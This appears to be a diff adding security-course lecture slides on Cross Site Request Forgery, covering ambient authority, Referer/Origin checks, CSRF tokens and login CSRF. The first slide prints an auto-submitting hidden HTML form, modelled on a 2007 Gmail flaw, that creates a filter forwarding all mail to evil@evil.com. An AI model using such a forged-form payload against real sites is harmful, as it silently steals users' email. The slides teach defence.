@@ -1,0 +1,95 @@
+
+
+\begin{frame}[fragile,label=submitForm]{submitting forms}
+    \begin{minted}[fontsize=\fontsize{10}{11},highlightlines={4,11},highlightcolor=cyan!40]{HTML}
+<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf"
+    enctype="multipart/form-data"> 
+    <input type="hidden" name="cf2_emc" value="true"/> 
+    <input type="hidden" name="cf2_email" value="evil@evil.com"/> 
+    ...
+    <input type="hidden" name="s" value="z"/> 
+    <input type="hidden" name="irf" value="on"/> 
+    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
+</form> 
+<script>
+document.forms[0].submit();
+</script>
+\end{minted}
+    \begin{itemize}
+    \item above form: 2007 GMail email filter form
+        \begin{itemize}
+        \item pre filled out: match all messages; forward to \texttt{evil@evil.com}
+        \end{itemize}
+    \item form will be submitted with \myemph{the user's cookies!}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Cross Site Request Forgery (CSRF)}
+    \begin{itemize}
+        \item take advantage of ``\myemph{ambient authority}'' of user
+            \begin{itemize}
+                \item e.g. user is allowed request to make an email filter
+            \end{itemize}
+        \item any webpage can make requests to other websites
+            \begin{itemize}
+                \item looks the same as requests made legitmately?
+                \item \myemph<2>{can't read result, but does that matter?}
+            \end{itemize}
+        \item problem: cookie in request $\not=$ user authorized request
+        \item problem: want to treat user as logged in when linked from another site
+            \begin{itemize}
+            \item can't just have browser omit cookies
+            \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\againframe<2>{evilInnocent}
+
+\begin{frame}{defending against CSRF (1)}
+    \begin{itemize}
+        \item one idea: check the Referer [sic] header
+            \begin{itemize}
+            \item actually works here --- browser is not going to betray its user
+            \end{itemize}
+        \item problem: not always sent
+        \vspace{.5cm}
+        \item<2> real solution: add a \myemph{secret token} (\myemph{CSRF token}) to the form
+        \item<2> must \myemph{not be guessable}
+            \begin{itemize}
+            \item example: copy of secret cookie value
+            \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{defending against CSRF (2)}
+    \begin{itemize}
+        \item browsers sometimes send \texttt{Origin} or \texttt{Referer} header
+            \begin{itemize}
+            \item if present, contain information about source of request
+            \end{itemize}
+        \item some types of requests require same origin
+            \begin{itemize}
+            \item XMLHttpRequest JavaScript API
+            \item can send headers normal requests can't
+            \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{CSRF versus changing form parameters}
+\end{frame}
+
+
+\subsection{Login CSRF}
+
+% FIXME
+\begin{frame}{subtle CSRF attack: login}
+    \begin{itemize}
+    \item vulnerable CSRF targets aren't just actions like ``email filter''
+    \item can also \myemph{log user into attacker's account}
+        \begin{itemize}
+        \item then, e.g., they enter payment information
+        \end{itemize}
+    \item attacker could read info from account?
+    \item often websites forgot to protect login form
+    \end{itemize}
+\end{frame}
